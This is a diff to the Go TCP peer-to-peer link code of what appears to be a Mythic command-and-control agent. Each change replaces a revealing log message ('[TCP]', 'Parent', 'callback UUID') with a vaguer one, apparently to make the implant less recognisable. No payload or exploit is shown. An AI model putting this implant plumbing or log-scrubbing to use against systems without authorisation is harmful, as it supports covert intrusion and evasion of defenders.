@@ -84,7 +84,7 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 	if err != nil {
 		return fmt.Errorf("failed to listen on %s: %w", t.BindAddress, err)
 	}
-	log.Printf("[TCP] Listening on %s for parent connection", t.BindAddress)
+	log.Printf("listening %s", t.BindAddress)
 
 	// Wait for the parent agent to connect (with timeout)
 	t.listener.(*net.TCPListener).SetDeadline(time.Now().Add(5 * time.Minute))
@@ -96,7 +96,7 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 	t.parentMu.Lock()
 	t.parentConn = conn
 	t.parentMu.Unlock()
-	log.Printf("[TCP] Parent connected from %s", conn.RemoteAddr())
+	log.Printf("peer connected from %s", conn.RemoteAddr())
 
 	// Send checkin message to parent
 	checkinMsg := structs.CheckinMessage{
@@ -169,15 +169,15 @@ func (t *TCPProfile) Checkin(agent *structs.Agent) error {
 	if callbackID, exists := checkinResponse["id"]; exists {
 		if callbackStr, ok := callbackID.(string); ok {
 			t.CallbackUUID = callbackStr
-			log.Printf("[TCP] Received callback UUID: %s", t.CallbackUUID)
+			log.Printf("session: %s", t.CallbackUUID)
 		}
 	} else if callbackUUID, exists := checkinResponse["uuid"]; exists {
 		if callbackStr, ok := callbackUUID.(string); ok {
 			t.CallbackUUID = callbackStr
-			log.Printf("[TCP] Received callback UUID: %s", t.CallbackUUID)
+			log.Printf("session: %s", t.CallbackUUID)
 		}
 	} else {
-		log.Printf("[TCP] No callback UUID in response, using payload UUID")
+		log.Printf("no session id, using default")
 		t.CallbackUUID = agent.PayloadUUID
 	}
 
@@ -496,7 +496,7 @@ func (t *TCPProfile) handleDeadParent() {
 	t.needsParent = true
 	t.needsParentMu.Unlock()
 
-	log.Printf("[TCP] Parent connection dead, waiting for relink")
+	log.Printf("peer lost, waiting")
 }
 
 // triggerRelink signals that this agent needs a new parent and blocks until one connects.
@@ -512,14 +512,14 @@ func (t *TCPProfile) triggerRelink() {
 	}
 
 	if !alreadyNeeds {
-		log.Printf("[TCP] Triggering relink — waiting for new parent connection")
+		log.Printf("relink waiting")
 	}
 
 	// Wait for acceptChildConnections to provide a new parent (with timeout)
 	// The main loop will retry after its normal sleep interval
 	select {
 	case <-t.parentReady:
-		log.Printf("[TCP] New parent connected via relink")
+		log.Printf("relink connected")
 	case <-time.After(5 * time.Second):
 		// Short wait — main loop will retry
 	}
@@ -536,7 +536,7 @@ func (t *TCPProfile) acceptChildConnections() {
 	for {
 		conn, err := t.listener.Accept()
 		if err != nil {
-			log.Printf("[TCP] Accept error: %v", err)
+			log.Printf("accept error: %v", err)
 			return
 		}
 
@@ -546,10 +546,10 @@ func (t *TCPProfile) acceptChildConnections() {
 		t.needsParentMu.Unlock()
 
 		if needsParent {
-			log.Printf("[TCP] New parent connection from %s (relink)", conn.RemoteAddr())
+			log.Printf("peer connected %s (relink)", conn.RemoteAddr())
 			go t.handleRelink(conn)
 		} else {
-			log.Printf("[TCP] New child connection from %s", conn.RemoteAddr())
+			log.Printf("downstream connected from %s", conn.RemoteAddr())
 			go t.handleNewChildCheckin(conn)
 		}
 	}
@@ -559,23 +559,23 @@ func (t *TCPProfile) acceptChildConnections() {
 // It re-sends the cached checkin data so the new parent can forward it to Mythic as a delegate.
 func (t *TCPProfile) handleRelink(conn net.Conn) {
 	if len(t.cachedCheckinData) == 0 {
-		log.Printf("[TCP] No cached checkin data for relink, treating as child")
+		log.Printf("no cached data, treating as downstream")
 		t.handleNewChildCheckin(conn)
 		return
 	}
 
 	// Send cached checkin data to the new parent
 	if err := t.sendTCP(conn, t.cachedCheckinData); err != nil {
-		log.Printf("[TCP] Failed to send checkin to new parent: %v", err)
+		log.Printf("relink send error: %v", err)
 		conn.Close()
 		return
 	}
-	log.Printf("[TCP] Sent cached checkin to new parent")
+	log.Printf("relink sent cached data")
 
 	// Read checkin response from parent (Mythic's response forwarded by parent)
 	respData, err := t.recvTCP(conn)
 	if err != nil {
-		log.Printf("[TCP] Failed to receive relink checkin response: %v", err)
+		log.Printf("relink recv error: %v", err)
 		conn.Close()
 		return
 	}
@@ -614,7 +614,7 @@ func (t *TCPProfile) handleRelink(conn net.Conn) {
 	default:
 	}
 
-	log.Printf("[TCP] Relink complete — new parent from %s", conn.RemoteAddr())
+	log.Printf("relink complete from %s", conn.RemoteAddr())
 }
 
 // handleNewChildCheckin reads the initial checkin from a new child connection,
@@ -622,7 +622,7 @@ func (t *TCPProfile) handleRelink(conn net.Conn) {
 func (t *TCPProfile) handleNewChildCheckin(conn net.Conn) {
 	data, err := t.recvTCP(conn)
 	if err != nil {
-		log.Printf("[TCP] Failed to read child checkin: %v", err)
+		log.Printf("downstream read error: %v", err)
 		conn.Close()
 		return
 	}
@@ -631,7 +631,7 @@ func (t *TCPProfile) handleNewChildCheckin(conn net.Conn) {
 	// We need to extract the UUID to track this connection
 	decoded, err := base64.StdEncoding.DecodeString(string(data))
 	if err != nil || len(decoded) < 36 {
-		log.Printf("[TCP] Invalid child checkin data")
+		log.Printf("invalid downstream data")
 		conn.Close()
 		return
 	}
@@ -665,7 +665,7 @@ func (t *TCPProfile) readFromChild(uuid string, conn net.Conn) {
 	for {
 		data, err := t.recvTCP(conn)
 		if err != nil {
-			log.Printf("[TCP] Child %s disconnected: %v", uuid[:8], err)
+			log.Printf("downstream %s disconnected: %v", uuid[:8], err)
 			t.RemoveChildConnection(t.resolveUUID(uuid))
 			// Send edge removal
 			t.EdgeMessages <- structs.P2PConnectionMessage{
@@ -721,11 +721,11 @@ func (t *TCPProfile) routeDelegatesToChildren(delegates []structs.DelegateMessag
 
 		if ok {
 			if err := t.sendTCP(conn, []byte(d.Message)); err != nil {
-				log.Printf("[TCP] Failed to forward delegate to %s: %v", targetUUID[:8], err)
+				log.Printf("forward error to %s: %v", targetUUID[:8], err)
 				t.RemoveChildConnection(targetUUID)
 			}
 		} else {
-			log.Printf("[TCP] No child connection for UUID %s", targetUUID[:8])
+			log.Printf("no downstream for %s", targetUUID[:8])
 		}
 	}
 }
